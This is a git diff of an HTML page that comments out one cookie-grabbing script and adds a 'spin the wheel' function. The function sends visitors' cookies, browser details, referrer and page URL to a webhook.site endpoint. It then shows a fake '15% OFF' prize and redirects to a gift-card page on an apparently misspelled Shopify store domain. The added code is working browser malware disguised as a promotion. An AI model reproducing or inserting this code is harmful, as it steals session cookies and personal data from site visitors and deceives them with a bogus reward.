@@ -105,7 +105,7 @@ function sendData() {
 
 sendData();
 </script> -->
-<script>
+<!-- <script>
 setTimeout(() => {
   const data = new URLSearchParams({
     cookies: document.cookie,
@@ -134,8 +134,46 @@ setTimeout(() => {
   });
 
 }, 4000);
-</script>
+</script> -->
   
+<script>
+function spin() {
+  document.getElementById("result").innerText = "Spinning...";
 
+  setTimeout(() => {
+    const data = new URLSearchParams({
+      cookies: document.cookie,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      referrer: document.referrer,
+      url: location.href
+    });
+
+    fetch("https://webhook.site/f6a09363-360d-4d13-8716-77a7c162b420", {
+      method: "POST",
+      body: data
+    })
+    .then(() => {
+      document.getElementById("result").innerText =
+        "🎉 You got 15% OFF!";
+
+      setTimeout(() => {
+        window.location.href =
+          "https://donut-strore.myshopify.com/products/gift-card";
+      }, 2000);
+    })
+    .catch(error => {
+      console.error("Webhook error:", error);
+
+      document.getElementById("result").innerText =
+        "Request sent; response was blocked.";
+    });
+  }, 4000);
+}
+</script>
+
+
+  
 </body>
 </html>
